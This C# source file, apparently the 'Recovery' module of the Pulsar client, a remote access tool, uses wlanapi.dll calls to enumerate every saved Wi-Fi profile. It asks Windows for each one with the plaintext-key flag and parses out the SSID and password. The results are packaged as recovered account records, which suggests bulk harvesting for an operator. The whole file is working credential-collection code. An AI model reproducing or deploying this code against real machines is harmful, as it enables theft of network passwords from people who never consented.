using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Xml;
using Pulsar.Common.Models;

namespace Pulsar.Client.Recovery
{
    public class WifiRecovery
    {
        public static List<RecoveredAccount> RecoverWifiPasswords()
        {
            var recoveredAccounts = new List<RecoveredAccount>();

            const int dwClientVersion = 2;
            IntPtr clientHandle = IntPtr.Zero;
            IntPtr pdwNegotiatedVersion = IntPtr.Zero;
            IntPtr pInterfaceList = IntPtr.Zero;
            WLAN_INTERFACE_INFO_LIST interfaceList;
            WLAN_PROFILE_INFO_LIST wifiProfileList;
            Guid InterfaceGuid;
            string wifiXmlProfile = null;
            IntPtr wlanAccess = IntPtr.Zero;
            IntPtr profileList = IntPtr.Zero;
            string profileName = "";

            try
            {
                // Open Wifi Handle
                int result = WlanOpenHandle(dwClientVersion, IntPtr.Zero, out pdwNegotiatedVersion, ref clientHandle);
                if (result != 0) return recoveredAccounts;

                // Find Wi-Fi interface GUID
                uint enumResult = WlanEnumInterfaces(clientHandle, IntPtr.Zero, ref pInterfaceList);
                if (enumResult != 0) return recoveredAccounts;

                interfaceList = new WLAN_INTERFACE_INFO_LIST(pInterfaceList);
                if (interfaceList.dwNumberofItems == 0) return recoveredAccounts;

                InterfaceGuid = ((WLAN_INTERFACE_INFO)interfaceList.InterfaceInfo[0]).InterfaceGuid;

                // Get Wifi Profile
                uint profileResult = WlanGetProfileList(clientHandle, InterfaceGuid, IntPtr.Zero, ref profileList);
                if (profileResult != 0) return recoveredAccounts;

                wifiProfileList = new WLAN_PROFILE_INFO_LIST(profileList);

                for (int i = 0; i < wifiProfileList.dwNumberOfItems; i++)
                {
                    try
                    {
                        profileName = (wifiProfileList.ProfileInfo[i]).strProfileName;
                        int decryptKey = 63;

                        // Retrieve Wifi SSID Name and Password
                        uint getProfileResult = WlanGetProfile(clientHandle, InterfaceGuid, profileName, IntPtr.Zero, out wifiXmlProfile, ref decryptKey, out wlanAccess);
                        if (getProfileResult != 0) continue;

                        XmlDocument xmlProfileXml = new XmlDocument();
                        xmlProfileXml.LoadXml(wifiXmlProfile);

                        XmlNodeList pathToSSID = xmlProfileXml.SelectNodes("//*[name()='WLANProfile']/*[name()='SSIDConfig']/*[name()='SSID']/*[name()='name']");
                        XmlNodeList pathToPassword = xmlProfileXml.SelectNodes("//*[name()='WLANProfile']/*[name()='MSM']/*[name()='security']/*[name()='sharedKey']/*[name()='keyMaterial']");

                        foreach (XmlNode ssid in pathToSSID)
                        {
                            string ssidName = ssid.InnerText;
                            foreach (XmlNode password in pathToPassword)
                            {
                                string wifiPassword = password.InnerText;

                                recoveredAccounts.Add(new RecoveredAccount
                                {
                                    Username = ssidName,
                                    Password = wifiPassword,
                                    Url = "WiFi Network",
                                    Application = "Windows WiFi"
                                });
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // Log or ignore individual profile errors
                        System.Diagnostics.Debug.WriteLine($"Error processing WiFi profile {profileName}: {ex.Message}");
                    }
                }

                // Close Wifi Handle
                WlanCloseHandle(clientHandle, IntPtr.Zero);
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine($"WiFi Recovery Error: {e.Message}");
            }
            finally
            {
                // Ensure handles are closed
                if (clientHandle != IntPtr.Zero)
                    WlanCloseHandle(clientHandle, IntPtr.Zero);
            }

            return recoveredAccounts;
        }

        #region wlanapi PInvoke
        [DllImport("Wlanapi.dll")]
        public static extern int WlanOpenHandle(int dwClientVersion, IntPtr pReserved, [Out] out IntPtr pdwNegotiatedVersion, ref IntPtr ClientHandle);

        [DllImport("Wlanapi", EntryPoint = "WlanCloseHandle")]
        public static extern uint WlanCloseHandle([In] IntPtr hClientHandle, IntPtr pReserved);

        [DllImport("Wlanapi", EntryPoint = "WlanEnumInterfaces")]
        public static extern uint WlanEnumInterfaces([In] IntPtr hClientHandle, IntPtr pReserved, ref IntPtr ppInterfaceList);

        [DllImport("wlanapi.dll", SetLastError = true)]
        public static extern uint WlanGetProfile([In] IntPtr clientHandle, [In, MarshalAs(UnmanagedType.LPStruct)] Guid interfaceGuid, [In, MarshalAs(UnmanagedType.LPWStr)] string profileName, [In] IntPtr pReserved, [Out, MarshalAs(UnmanagedType.LPWStr)] out string profileXml, [In, Out, Optional] ref int flags, [Out, Optional] out IntPtr pdwGrantedAccess);

        [DllImport("wlanapi.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern uint WlanGetProfileList([In] IntPtr clientHandle, [In, MarshalAs(UnmanagedType.LPStruct)] Guid interfaceGuid, [In] IntPtr pReserved, ref IntPtr profileList);
        #endregion

        #region WiFi structs
        [StructLayout(LayoutKind.Sequential)]
        public struct WLAN_INTERFACE_INFO_LIST
        {
            public int dwNumberofItems;
            public int dwIndex;
            public WLAN_INTERFACE_INFO[] InterfaceInfo;

            public WLAN_INTERFACE_INFO_LIST(IntPtr pList)
            {
                dwNumberofItems = (int)Marshal.ReadInt64(pList, 0);
                dwIndex = (int)Marshal.ReadInt64(pList, 4);
                InterfaceInfo = new WLAN_INTERFACE_INFO[dwNumberofItems];
                for (int i = 0; i < dwNumberofItems; i++)
                {
                    IntPtr pItemList = new IntPtr(pList.ToInt64() + (i * 532) + 8);
                    WLAN_INTERFACE_INFO wii = new WLAN_INTERFACE_INFO();
                    wii = (WLAN_INTERFACE_INFO)Marshal.PtrToStructure(pItemList, typeof(WLAN_INTERFACE_INFO));
                    InterfaceInfo[i] = wii;
                }
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WLAN_INTERFACE_INFO
        {
            public Guid InterfaceGuid;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string strInterfaceDescription;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WLAN_PROFILE_INFO
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string strProfileName;
            public WlanProfileFlags ProfileFLags;
        }

        [Flags]
        public enum WlanProfileFlags
        {
            AllUser = 0,
            GroupPolicy = 1,
            User = 2
        }

        public struct WLAN_PROFILE_INFO_LIST
        {
            public int dwNumberOfItems;
            public int dwIndex;
            public WLAN_PROFILE_INFO[] ProfileInfo;

            public WLAN_PROFILE_INFO_LIST(IntPtr ppProfileList)
            {
                dwNumberOfItems = (int)Marshal.ReadInt64(ppProfileList);
                dwIndex = (int)Marshal.ReadInt64(ppProfileList, 4);
                ProfileInfo = new WLAN_PROFILE_INFO[dwNumberOfItems];
                IntPtr ppProfileListTemp = new IntPtr(ppProfileList.ToInt64() + 8);

                for (int i = 0; i < dwNumberOfItems; i++)
                {
                    ppProfileList = new IntPtr(ppProfileListTemp.ToInt64() + i * Marshal.SizeOf(typeof(WLAN_PROFILE_INFO)));
                    ProfileInfo[i] = (WLAN_PROFILE_INFO)Marshal.PtrToStructure(ppProfileList, typeof(WLAN_PROFILE_INFO));
                }
            }
        }
        #endregion
    }
}